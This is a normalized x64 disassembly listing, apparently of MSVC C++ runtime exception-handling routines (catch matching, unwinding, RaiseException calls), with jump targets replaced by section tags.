mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_18000ad80
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180007770
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_1800085f0#2
sub_18000adc0
sub rsp 0x28
mov rax [ rcx ]
mov ecx [ rax ]
cmp ecx 0xe0434f4d
je r-xdata
call sub_18000a690
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp ecx 0xe06d7363
jne r-xdata
xor eax eax
add rsp 0x28
retn
call sub_18000a690
add [ rax + 0x100 ] 0xffffffff
call sub_18000a690
mov [ rax + 0x100 ] 0x0
call sub_18000c530
sub_18000ae10
mov [ rsp + 0x20 ] r9d
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov rbx rdx
mov r14 rcx
call sub_18000a060
mov edi eax
call sub_180006aa0
mov r15 rax
mov [ rsp + 0x28 ] rax
call sub_18000a690
add [ rax + 0x100 ] 0x1
nop
call sub_18000a690
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_18000a690
add [ rax + 0x100 ] 0xffffffff
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx rbx
mov rcx r14
call sub_18000a100
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_18000c560
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_18000c560
movsxd r12 edi
call sub_180006aa0
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_180006aa0
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_180006aa0
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180006aa0
lea rcx [ rax + rbx ]
test rcx rcx
je r-xdata
mov [ rsp + 0x24 ] edi
mov rbx [ rsp + 0x78 ]
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx [ rsp + 0x78 ]
mov rcx r14
call sub_18000a100
call sub_180006aa0
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
cmp edi 0xffffffff
je r-xdata
xor eax eax
call sub_180006aa0
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180006aa0
add rax rbx
jmp r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_1800131b0
mov rcx r15
call sub_180006ae0
sub_18000b000
push rbx
sub rsp 0x20
mov r9 [ rcx ]
mov [ r8 ] 0x0
mov rbx r8
cmp [ r9 ] 0xe06d7363
jne r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
cmp [ r9 + 0x18 ] 0x4
jne r-xdata
cmp [ r9 ] 0xe06d7363
jne r-xdata
mov eax [ r9 + 0x20 ]
cmp eax 0x19930520
je r-xdata
cmp [ r9 + 0x18 ] 0x4
jne r-xdata
mov rax [ rdx + 0x28 ]
cmp [ r9 + 0x28 ] rax
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov ecx [ r9 + 0x20 ]
cmp ecx 0x19930520
je r-xdata
mov [ r8 ] 0x1
cmp eax 0x19930522
jne r-xdata
cmp [ r9 + 0x30 ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_18000a690
mov [ rax + 0x2d0 ] 0x1
mov [ rbx ] 0x1
mov eax 0x1
add rsp 0x20
pop rbx
retn
cmp ecx 0x19930522
jne r-xdata
sub_18000b0b0
test rcx rcx
je r-xdata
retn 0x0
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
movsxd rdx [ rax + 0x4 ]
test edx edx
je r-xdata
mov rax rdx
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_18000b150
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rdi
sub rsp 0x48
test rdx rdx
mov rbx rdx
mov rdi rcx
jne r-xdata
mov [ rsp + 0x78 ] rbp
xor bpl bpl
mov [ rsp + 0x28 ] r14
xor r14d r14d
mov [ rsp + 0x70 ] bpl
cmp [ rdx ] r14d
jle r-xdata
call sub_18000c560
mov r14 [ rsp + 0x28 ]
mov al bpl
mov rbp [ rsp + 0x78 ]
add rsp 0x48
pop rdi
pop rbx
retn
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x20 ] r15
xor r15d r15d
nop
nop
add r14d 0x1
add r15 0x14
cmp r14d [ rbx ]
jl r-xdata
call sub_180006ac0
mov r13 [ rdi + 0x30 ]
mov rbp rax
movsxd rax [ r12 ]
add rbp rax
call sub_180006aa0
movsxd rdi [ rbx + 0x4 ]
add rax r15
add rdi rax
cmp [ rdi + 0x4 ] 0x0
je r-xdata
call sub_180006ac0
mov r11 rax
mov rax [ rdi + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r12 [ r11 + rcx + 0x4 ]
call sub_180006ac0
mov r11 rax
mov rax [ rdi + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov esi [ r11 + rcx ]
test esi esi
jle r-xdata
mov r15 [ rsp + 0x20 ]
mov r13 [ rsp + 0x30 ]
mov r12 [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x60 ]
mov bpl 0x1
mov [ rsp + 0x70 ] bpl
jmp r-xdata
movsxd rbx [ rdi + 0x4 ]
call sub_180006aa0
mov r11 rax
add r11 rbx
je r-xdata
mov rbx [ rsp + 0x68 ]
mov rdi [ rsp + 0x60 ]
mov bpl 0x1
mov [ rsp + 0x70 ] bpl
jmp r-xdata
test ebx ebx
je r-xdata
xor r11d r11d
movsxd rbx [ rdi + 0x4 ]
call sub_180006aa0
lea r11 [ rbx + rax ]
jmp r-xdata
mov rbx [ rsp + 0x68 ]
mov rdi [ rsp + 0x60 ]
mov bpl 0x1
mov [ rsp + 0x70 ] bpl
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ r11 + 0x10 ] 0x0
je r-xdata
xor ebx ebx
call sub_180006aa0
mov rbx rax
movsxd rax [ rdi + 0x4 ]
add rbx rax
jmp r-xdata
test [ rbp ] 0x2
je r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
call sub_180006ac0
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rbx r11
je r-xdata
mov eax [ r13 ]
test al 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
xor ebx ebx
call sub_180006aa0
mov rbx rax
movsxd rax [ rdi + 0x4 ]
add rbx rax
jmp r-xdata
test al 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
sub esi 0x1
add r12 0x4
test esi esi
jle r-xdata
test edx edx
jne r-xdata
add rax 0x1
test ecx ecx
jne r-xdata
call sub_180006ac0
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea r8 [ r11 + rax + 0x10 ]
lea rax [ rbx + 0x10 ]
sub r8 rax
nop
test al 0x2
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x68 ]
mov rdi [ rsp + 0x60 ]
movzx ebp [ rsp + 0x70 ]
mov rbx [ rsp + 0x68 ]
mov rdi [ rsp + 0x60 ]
jmp r-xdata
movzx edx [ rax ]
movzx ecx [ rax + r8 ]
sub edx ecx
jne r-xdata
mov rbx [ rsp + 0x68 ]
test [ rdi ] 0x2
jne r-xdata
mov rbx [ rsp + 0x68 ]
mov rdi [ rsp + 0x60 ]
mov bpl 0x1
mov [ rsp + 0x70 ] bpl
jmp r-xdata
sub_18000b3a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rbp rcx
cmp [ rcx ] edi
jle r-xdata
xor al al
xor esi esi
nop
xor eax eax
call sub_180006aa0
movsxd rcx [ rbp + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180006aa0
add rax rbx
jmp r-xdata
mov al 0x1
jmp r-xdata
add edi 0x1
add rsi 0x14
cmp edi [ rbp ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_1800075c0
test al al
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call sub_180006aa0
movsxd rcx [ rbp + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
sub_18000b430
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov rdi rcx
xor r12d r12d
mov [ rsp + 0x20 ] r12d
mov [ rsp + 0xb0 ] r12d
mov [ rsp + 0x40 ] r12
mov [ rsp + 0xc8 ] r12
call sub_18000a690
mov r15 [ rax + 0xf8 ]
mov [ rsp + 0x28 ] r15
call sub_18000a690
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xc0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xb8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov rax [ rdi + 0x30 ]
mov [ rsp + 0x48 ] rax
mov r13 [ rdi + 0x28 ]
mov [ rsp + 0x50 ] r13
call sub_18000a690
mov [ rax + 0xf0 ] rsi
call sub_18000a690
mov [ rax + 0xf8 ] rbx
call sub_18000a690
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x60 ]
call sub_180006fa0
mov r14 rax
mov [ rsp + 0x30 ] rax
cmp [ rdi + 0x58 ] r12
je r-xdata
mov r8d 0x100
mov rdx r13
mov rcx [ rsp + 0x48 ]
call sub_1800131b0
mov rbx rax
mov [ rsp + 0x40 ] rax
mov rdi [ rsp + 0xc0 ]
jmp r-xdata
mov [ rsp + 0xb0 ] 0x1
call sub_18000a690
mov rbx [ rax + 0x138 ]
mov [ rsp + 0xc8 ] rbx
call sub_18000a690
mov [ rax + 0xf0 ] rbx
mov rcx r14
call sub_180007040
test r12d r12d
jne r-xdata
call sub_18000a690
mov [ rax + 0xf0 ] rdi
call sub_18000a690
mov [ rax + 0xf8 ] r15
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r13 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
mov eax [ rsi + 0x20 ]
cmp eax 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_180006ff0
test eax eax
je r-xdata
cmp eax 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18000b0b0
cmp eax 0x19930522
jne r-xdata
sub_18000b543
mov [ rsp + 0x20 ] 0x1
call sub_18000a690
xor r12d r12d
mov [ rax + 0x2d0 ] r12d
cmp [ rsp + 0xb0 ] r12d
je r-xdata
mov rsi [ rsp + 0xb8 ]
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
call [ RaiseException@IAT ]
mov dl 0x1
mov rsi [ rsp + 0xb8 ]
mov rcx rsi
call sub_18000b0b0
mov r11 [ rsp + 0xc8 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
call [ RaiseException@IAT ]
jmp r-xdata
call sub_18000a690
mov [ rax + 0xf0 ] rdi
call sub_18000a690
mov [ rax + 0xf8 ] r15
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r13 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
mov r12d [ rsp + 0x20 ]
mov rbx [ rsp + 0x40 ]
mov r15 [ rsp + 0x28 ]
mov rdi [ rsp + 0xc0 ]
mov r13 [ rsp + 0x50 ]
mov r14 [ rsp + 0x30 ]
mov rcx r14
call sub_180007040
test r12d r12d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
mov eax [ rsi + 0x20 ]
cmp eax 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_180006ff0
test eax eax
je r-xdata
cmp eax 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18000b0b0
cmp eax 0x19930522
jne r-xdata
sub_18000b690
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call sub_180007040
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_18000a690
mov rcx [ rbp + 0xc0 ]
mov [ rax + 0xf0 ] rcx
call sub_18000a690
mov rcx [ rbp + 0x28 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xb8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
mov eax [ rbx + 0x20 ]
cmp eax 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_180006ff0
test eax eax
je r-xdata
cmp eax 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_18000b0b0
cmp eax 0x19930522
jne r-xdata
sub_18000b720
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rdi r9
mov r12 r8
mov rsi rdx
mov r14 rcx
xor ebx ebx
cmp [ r8 + 0x4 ] ebx
je r-xdata
xor eax eax
movsxd r13 [ r8 + 0x4 ]
call sub_180006aa0
lea rdx [ r13 + rax ]
test rdx rdx
je r-xdata
test r13d r13d
je r-xdata
mov r11 rbx
call sub_180006aa0
mov r11 rax
movsxd rax [ r12 + 0x4 ]
add r11 rax
jmp r-xdata
movsxd rax [ r12 + 0x8 ]
test eax eax
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov ecx [ r12 ]
bt ecx 0x1f
jb r-xdata
bt [ r12 ] 0x1f
jae r-xdata
test cl 0x8
je r-xdata
add rax [ rsi ]
mov rsi rax
test [ rdi ] 0x1
je r-xdata
mov edx 0x1
mov rcx [ r14 + 0x28 ]
call sub_18000fdd0
test eax eax
je r-xdata
cmp [ rdi + 0x18 ] 0x0
je r-xdata
mov edx 0x1
mov rcx [ r14 + 0x28 ]
call sub_18000fdd0
test eax eax
je r-xdata
call sub_18000c560
mov edx 0x1
mov rcx rsi
call sub_18000fdd0
test eax eax
je r-xdata
mov edx 0x1
mov rcx [ r14 + 0x28 ]
call sub_18000fdd0
test eax eax
je r-xdata
call sub_180006ac0
mov rdx rax
movsxd rax [ rdi + 0x18 ]
add rdx rax
je r-xdata
call sub_18000c560
mov edx 0x1
mov rcx rsi
call sub_18000fdd0
test eax eax
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ rsi ] rcx
lea rdx [ rdi + 0x8 ]
call sub_18000b120
mov [ rsi ] rax
jmp r-xdata
call sub_18000c560
mov edx 0x1
mov rcx rsi
call sub_18000fdd0
test eax eax
je r-xdata
mov edx 0x1
mov rcx [ r14 + 0x28 ]
call sub_18000fdd0
test eax eax
je r-xdata
movsxd r8 [ rdi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx rsi
call sub_18000aa30
cmp [ rdi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
movsxd r10 [ rdi + 0x14 ]
lea rdx [ rdi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_18000b120
mov rdx rax
mov r8 r10
mov rcx rsi
call sub_18000aa30
jmp r-xdata
call sub_18000c560
mov edx 0x1
mov rcx rsi
call sub_18000fdd0
test eax eax
je r-xdata
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rdi + 0x18 ] 0x0
je r-xdata
lea rdx [ rdi + 0x8 ]
call sub_18000b120
mov [ rsi ] rax
jmp r-xdata
mov rcx rbx
call sub_180006ac0
mov rcx rax
movsxd rax [ rdi + 0x18 ]
add rcx rax
jmp r-xdata
test [ rdi ] 0x4
setne bl
add ebx 0x1
mov [ rsp + 0x20 ] ebx
jmp r-xdata
call sub_18000fdd0
test eax eax
je r-xdata
sub_18000b950
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
bt [ r8 ] 0x1f
jae r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
cmp [ rbx + 0x18 ] 0x0
je r-xdata
cmp eax 0x1
jne r-xdata
call sub_18000b720
sub eax 0x1
je r-xdata
xor r11d r11d
call sub_180006ac0
movsxd r11 [ rbx + 0x18 ]
add r11 rax
jmp r-xdata
jmp r-xdata
cmp [ rbx + 0x18 ] 0x0
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18000b120
mov rdx rax
mov rcx rdi
call r11
xor r11d r11d
call sub_180006ac0
mov r11 rax
movsxd rax [ rbx + 0x18 ]
add r11 rax
jmp r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18000b120
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r11
jmp r-xdata
sub_18000ba10
mov rax rsp
mov [ rax + 0x18 ] r8
push rsi
push r12
push r14
push r15
sub rsp 0x78
cmp [ rcx ] 0x80000003
mov r14 r9
mov rsi r8
mov r15 rdx
mov r12 rcx
je r-xdata
add rsp 0x78
pop r15
pop r14
pop r12
pop rsi
retn
mov [ rax + 0x10 ] rbx
mov [ rax - 0x30 ] rdi
mov [ rax - 0x38 ] r13
call sub_18000a690
mov edi [ rsp + 0xd0 ]
mov r13 [ rsp + 0xc0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ r13 + 0xc ] 0x0
mov [ rsp + 0x70 ] rbp
jne r-xdata
call sub_18000a690
mov rbx rax
call sub_18000a250
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov ebp [ rsp + 0xc8 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xa0 ]
mov r8d edi
mov r9d ebp
mov rdx r13
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_180006e60
mov rsi rax
mov eax [ rsp + 0xa0 ]
cmp eax [ rsp + 0x50 ]
jae r-xdata
call sub_18000c560
cmp [ r12 ] 0xe0434f4d
je r-xdata
mov rbp [ rsp + 0x70 ]
nop
mov rax [ rsp + 0xd8 ]
mov r9 r14
mov r8 rsi
mov [ rsp + 0x30 ] rax
mov rdx r15
mov rcx r12
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r13
call sub_180006db0
test eax eax
jne r-xdata
add eax 0x1
add rsi 0x14
cmp eax [ rsp + 0x50 ]
mov [ rsp + 0xa0 ] eax
jb r-xdata
cmp ebp [ rsi + 0x4 ]
jg r-xdata
mov rdi [ rsp + 0x68 ]
mov rbx [ rsp + 0xa8 ]
mov r13 [ rsp + 0x60 ]
cmp ebp [ rsi ]
jl r-xdata
call sub_180006aa0
movsxd rcx [ rsi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rsi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
call sub_180006aa0
movsxd rcx [ rsi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rsi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_180006aa0
movsxd rcx [ rsi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rsi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180006aa0
lea rcx [ rax + rbx ]
test rcx rcx
je r-xdata
mov eax [ rsp + 0xa0 ]
call sub_180006aa0
mov ecx [ rsi + 0xc ]
lea r9 [ rsp + 0x58 ]
sub ecx 0x1
mov r8 r13
movsxd rcx ecx
lea rdx [ rcx + rcx * 4 ]
mov rcx r15
lea rdi [ rax + rdx * 4 ]
movsxd rax [ rsi + 0x10 ]
mov rdx r14
add rdi rax
call sub_180006990
mov rbx rax
call sub_180006aa0
movsxd rcx [ rdi + 0xc ]
mov r8 [ rsp + 0xb0 ]
add rax rcx
mov ecx [ rsi ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] ecx
mov r9 rbx
mov rdx r12
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_1800070b0
mov eax [ rsp + 0xa0 ]
jmp r-xdata
call sub_180006aa0
movsxd rcx [ rsi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rsi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_180006aa0
movsxd rcx [ rsi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rsi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180006aa0
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_18000bc90
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x570
mov rbp [ rsp + 0x5d0 ]
mov r13 rdx
mov r14 rcx
xor r15b r15b
mov rdx r9
mov rcx rbp
mov r12 r9
mov rbx r8
mov [ rsp + 0x5b0 ] r15b
call sub_180009fd0
lea r9 [ rsp + 0x68 ]
mov r8 rbp
mov rdx r12
mov rcx r13
mov edi eax
mov [ rsp + 0x58 ] eax
call sub_180006990
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_18000a150
cmp edi eax
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_18000a150
mov edi eax
mov [ rsp + 0x58 ] eax
lea rcx [ rsp + 0x68 ]
mov r9d edi
mov r8 rbp
mov rdx r12
call sub_18000a100
mov r9d edi
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_18000a110
jmp r-xdata
call sub_18000c560
cmp edi [ rbp + 0x4 ]
jl r-xdata
cmp edi 0xffffffff
jl r-xdata
cmp [ r14 ] 0xe06d7363
jne r-xdata
cmp [ r14 ] 0xe06d7363
jne r-xdata
cmp [ r14 + 0x18 ] 0x4
jne r-xdata
cmp [ rbp + 0xc ] 0x0
jbe r-xdata
cmp [ r14 + 0x18 ] 0x4
jne r-xdata
mov eax [ r14 + 0x20 ]
cmp eax 0x19930520
je r-xdata
call sub_18000a690
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rsp + 0x5d8 ] 0x0
jne r-xdata
mov eax [ r14 + 0x20 ]
cmp eax 0x19930520
je r-xdata
cmp [ r14 + 0x30 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
add rsp 0x570
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rbp
pop rbx
retn
call sub_18000c560
call sub_18000c530
mov rax [ rsp + 0x5e8 ]
mov r9 r12
mov r8 rbx
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x5e0 ]
mov rdx r13
mov [ rsp + 0x30 ] eax
mov rcx r14
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbp
call sub_18000ba10
jmp r-xdata
cmp [ rbp + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_18000a690
cmp [ rax + 0xf0 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov eax [ rbp ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rsp + 0x5e0 ]
lea rax [ rsp + 0x54 ]
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x50 ]
mov r9d edi
mov rdx rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_180006e60
mov ecx [ rsp + 0x50 ]
mov edx [ rsp + 0x54 ]
cmp ecx edx
mov rbx rax
mov [ rsp + 0x60 ] rax
jae r-xdata
cmp eax 0x19930522
jne r-xdata
call sub_18000a690
mov r14 [ rax + 0xf0 ]
call sub_18000a690
mov rcx [ r14 + 0x38 ]
mov rbx [ rax + 0xf8 ]
mov [ rsp + 0x5c0 ] rbx
call sub_180006b00
mov edx 0x1
mov rcx r14
call sub_18000fdd0
test eax eax
jne r-xdata
cmp [ rbp + 0x20 ] 0x0
je r-xdata
mov [ rsp + 0x568 ] rsi
cmp [ r14 ] 0xe06d7363
jne r-xdata
call sub_18000c560
movsxd rbx [ rbp + 0x20 ]
call sub_180006aa0
add rax rbx
je r-xdata
add ecx 0x1
add rbx 0x14
cmp ecx edx
mov [ rsp + 0x50 ] ecx
mov [ rsp + 0x60 ] rbx
jb r-xdata
cmp edi [ rbx + 0x4 ]
jg r-xdata
call sub_18000a690
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ r14 + 0x18 ] 0x4
jne r-xdata
test ebx ebx
je r-xdata
cmp [ rbx ] edi
jg r-xdata
test r15b r15b
mov rsi [ rsp + 0x568 ]
jne r-xdata
call sub_180006aa0
movsxd rdi [ rbx + 0x10 ]
mov r15d [ rbx + 0xc ]
add rdi rax
test r15d r15d
jle r-xdata
call sub_18000a690
mov rbx [ rax + 0x108 ]
call sub_18000a690
mov rdx rbx
mov rcx r14
mov [ rax + 0x108 ] 0x0
call sub_18000b150
test al al
jne r-xdata
mov eax [ r14 + 0x20 ]
cmp eax 0x19930520
je r-xdata
xor edx edx
call sub_180006aa0
mov rdx rax
movsxd rax [ rbp + 0x20 ]
add rdx rax
jmp r-xdata
mov r15b [ rsp + 0x5b0 ]
nop
mov rbx [ rsp + 0x5c0 ]
mov rcx rbx
call sub_18000b3a0
test al al
je r-xdata
cmp [ r14 + 0x30 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
lea r9 [ rsp + 0x5b0 ]
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_180006990
mov rbx rax
call sub_18000a690
mov r8 [ rsp + 0x5c0 ]
lea rcx [ rsp + 0x90 ]
mov r9 rbx
mov rdx r14
mov [ rax + 0x110 ] rcx
mov al [ rsp + 0x5d8 ]
mov rcx r13
mov [ rsp + 0x40 ] al
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] rbp
mov [ rsp + 0x28 ] 0xffffffff
mov [ rsp + 0x20 ] 0x0
call sub_1800070b0
mov rcx r14
call sub_18000b150
test al al
jne r-xdata
sub r15d 0x1
add rdi 0x14
test r15d r15d
jg r-xdata
nop
nop
call sub_18000c530
mov dl 0x1
mov rcx r14
call sub_18000b0b0
lea r11 [ r--data ]
lea rdx [ rsp + 0x5b0 ]
lea rcx [ rsp + 0x78 ]
mov [ rsp + 0x5b0 ] r11
call sub_180007610
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
mov [ rsp + 0x78 ] r11
call sub_180007410
int3
call sub_18000c560
cmp eax 0x19930522
jne r-xdata
call sub_180006ac0
mov rcx [ r14 + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea r13 [ rax + rdx + 0x4 ]
call sub_180006ac0
mov rcx [ r14 + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov ebp [ rax + rdx ]
test ebp ebp
jle r-xdata
mov rbx [ rsp + 0x60 ]
